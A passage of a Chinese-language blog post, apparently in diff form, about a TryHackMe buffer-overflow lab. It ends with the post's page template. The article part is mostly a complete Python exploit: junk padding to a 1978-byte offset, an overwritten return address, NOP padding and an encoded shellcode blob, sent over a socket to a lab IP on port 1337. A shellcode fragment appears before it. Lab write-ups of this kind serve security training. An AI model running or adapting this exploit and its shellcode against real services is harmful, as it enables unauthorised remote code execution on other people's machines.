class="hljs-string">&quot;\xa4\x99\x09\xfc\xdf\xa6\x82\x03\x0f\x2f\xd0\x27\x8b\x6b\x82&quot;</span><br><span class="hljs-string">&quot;\x46\x8a\xd1\x65\x76\xcc\xb9\xda\xd2\x87\x54\x0e\x6f\xca\x30&quot;</span><br><span class="hljs-string">&quot;\xe3\x42\xf4\xc0\x6b\xd4\x87\xf2\x34\x4e\x0f\xbf\xbd\x48\xc8&quot;</span><br><span class="hljs-string">&quot;\xc0\x97\x2d\x46\x3f\x18\x4e\x4f\x84\x4c\x1e\xe7\x2d\xed\xf5&quot;</span><br><span class="hljs-string">&quot;\xf7\xd2\x38\x59\xa7\x7c\x93\x1a\x17\x3d\x43\xf3\x7d\xb2\xbc&quot;</span><br><span class="hljs-string">&quot;\xe3\x7e\x18\xd5\x8e\x85\xcb\xd0\x43\xae\xe5\x8d\x59\xb0\xe8&quot;</span><br><span class="hljs-string">&quot;\x11\xd7\x56\x60\xba\xb1\xc1\x1d\x23\x98\x99\xbc\xac\x36\xe4&quot;</span><br><span class="hljs-string">&quot;\xff\x27\xb5\x19\xb1\xcf\xb0\x09\x26\x20\x8f\x73\xe1\x3f\x25&quot;</span><br><span class="hljs-string">&quot;\x1b\x6d\xad\xa2\xdb\xf8\xce\x7c\x8c\xad\x21\x75\x58\x40\x1b&quot;</span><br><span class="hljs-string">&quot;\x2f\x7e\x99\xfd\x08\x3a\x46\x3e\x96\xc3\x0b\x7a\xbc\xd3\xd5&quot;</span><br><span class="hljs-string">&quot;\x83\xf8\x87\x89\xd5\x56\x71\x6c\x8c\x18\x2b\x26\x63\xf3\xbb&quot;</span><br><span class="hljs-string">&quot;\xbf\x4f\xc4\xbd\xbf\x85\xb2\x21\x71\x70\x83\x5e\xbe\x14\x03&quot;</span><br><span class="hljs-string">&quot;\x27\xa2\x84\xec\xf2\x66\xa4\x0e\xd6\x92\x4d\x97\xb3\x1e\x10&quot;</span><br><span class="hljs-string">&quot;\x28\x6e\x5c\x2d\xab\x9a\x1d\xca\xb3\xef\x18\x96\x73\x1c\x51&quot;</span><br><span class="hljs-string">&quot;\x87\x11\x22\xc6\xa8\x33&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>由于生成载荷过程中可能会使用一些编码器，所以可能会需要多一些空间用来解码，可以填充变量设置为 16 个或更多“无操作”(\x90) 字节的字符串来做到这一点：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#导入套接字模块</span><br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment">#目标IP</span><br>ip = <span class="hljs-string">&quot;10.10.67.178&quot;</span><br><span class="hljs-comment">#目标端口</span><br>port = <span class="hljs-number">1337</span><br><br><span class="hljs-comment">#要发送的缓冲区</span><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span> <br><br><span class="hljs-comment">#EIP指针偏移</span><br>offset = <span class="hljs-number">1978</span><br><br><span class="hljs-comment">#按偏移发送垃圾数据填充</span><br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br><br><span class="hljs-comment">#EIP要覆盖写入的内存地址</span><br>retn = <span class="hljs-string">&quot;\xaf\x11\x50\x62&quot;</span><br><br><span class="hljs-comment">#多申请一点空间解码</span><br>padding = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">16</span><br><br><span class="hljs-comment">#有效载荷</span><br>payload = (<span class="hljs-string">&quot;\xb8\x3f\xaa\xdc\x4b\xdb\xd3\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="hljs-string">&quot;\x52\x31\x42\x12\x83\xc2\x04\x03\x7d\xa4\x3e\xbe\x7d\x50\x3c&quot;</span><br><span class="hljs-string">&quot;\x41\x7d\xa1\x21\xcb\x98\x90\x61\xaf\xe9\x83\x51\xbb\xbf\x2f&quot;</span><br><span class="hljs-string">&quot;\x19\xe9\x2b\xbb\x6f\x26\x5c\x0c\xc5\x10\x53\x8d\x76\x60\xf2&quot;</span><br><span class="hljs-string">&quot;\x0d\x85\xb5\xd4\x2c\x46\xc8\x15\x68\xbb\x21\x47\x21\xb7\x94&quot;</span><br><span class="hljs-string">&quot;\x77\x46\x8d\x24\xfc\x14\x03\x2d\xe1\xed\x22\x1c\xb4\x66\x7d&quot;</span><br><span class="hljs-string">&quot;\xbe\x37\xaa\xf5\xf7\x2f\xaf\x30\x41\xc4\x1b\xce\x50\x0c\x52&quot;</span><br><span class="hljs-string">&quot;\x2f\xfe\x71\x5a\xc2\xfe\xb6\x5d\x3d\x75\xce\x9d\xc0\x8e\x15&quot;</span><br><span class="hljs-string">&quot;\xdf\x1e\x1a\x8d\x47\xd4\xbc\x69\x79\x39\x5a\xfa\x75\xf6\x28&quot;</span><br><span class="hljs-string">&quot;\xa4\x99\x09\xfc\xdf\xa6\x82\x03\x0f\x2f\xd0\x27\x8b\x6b\x82&quot;</span><br><span class="hljs-string">&quot;\x46\x8a\xd1\x65\x76\xcc\xb9\xda\xd2\x87\x54\x0e\x6f\xca\x30&quot;</span><br><span class="hljs-string">&quot;\xe3\x42\xf4\xc0\x6b\xd4\x87\xf2\x34\x4e\x0f\xbf\xbd\x48\xc8&quot;</span><br><span class="hljs-string">&quot;\xc0\x97\x2d\x46\x3f\x18\x4e\x4f\x84\x4c\x1e\xe7\x2d\xed\xf5&quot;</span><br><span class="hljs-string">&quot;\xf7\xd2\x38\x59\xa7\x7c\x93\x1a\x17\x3d\x43\xf3\x7d\xb2\xbc&quot;</span><br><span class="hljs-string">&quot;\xe3\x7e\x18\xd5\x8e\x85\xcb\xd0\x43\xae\xe5\x8d\x59\xb0\xe8&quot;</span><br><span class="hljs-string">&quot;\x11\xd7\x56\x60\xba\xb1\xc1\x1d\x23\x98\x99\xbc\xac\x36\xe4&quot;</span><br><span class="hljs-string">&quot;\xff\x27\xb5\x19\xb1\xcf\xb0\x09\x26\x20\x8f\x73\xe1\x3f\x25&quot;</span><br><span class="hljs-string">&quot;\x1b\x6d\xad\xa2\xdb\xf8\xce\x7c\x8c\xad\x21\x75\x58\x40\x1b&quot;</span><br><span class="hljs-string">&quot;\x2f\x7e\x99\xfd\x08\x3a\x46\x3e\x96\xc3\x0b\x7a\xbc\xd3\xd5&quot;</span><br><span class="hljs-string">&quot;\x83\xf8\x87\x89\xd5\x56\x71\x6c\x8c\x18\x2b\x26\x63\xf3\xbb&quot;</span><br><span class="hljs-string">&quot;\xbf\x4f\xc4\xbd\xbf\x85\xb2\x21\x71\x70\x83\x5e\xbe\x14\x03&quot;</span><br><span class="hljs-string">&quot;\x27\xa2\x84\xec\xf2\x66\xa4\x0e\xd6\x92\x4d\x97\xb3\x1e\x10&quot;</span><br><span class="hljs-string">&quot;\x28\x6e\x5c\x2d\xab\x9a\x1d\xca\xb3\xef\x18\x96\x73\x1c\x51&quot;</span><br><span class="hljs-string">&quot;\x87\x11\x22\xc6\xa8\x33&quot;</span>)<br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-keyword">try</span>:<br>  s.connect((ip, port))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220803014535863.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220803014535863"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>缓冲区溢出</div>
+      <div>http://example.com/2022/10/06/缓冲区溢出/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/Windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6%E4%B8%8E%E4%B8%80%E4%BA%9B%E6%9C%BA%E5%88%B6/" title="Windows系统组件与一些机制">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows系统组件与一些机制</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/CVE-2022-26923/" title="CVE-2022-26923">
+                        <span class="hidden-mobile">CVE-2022-26923</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
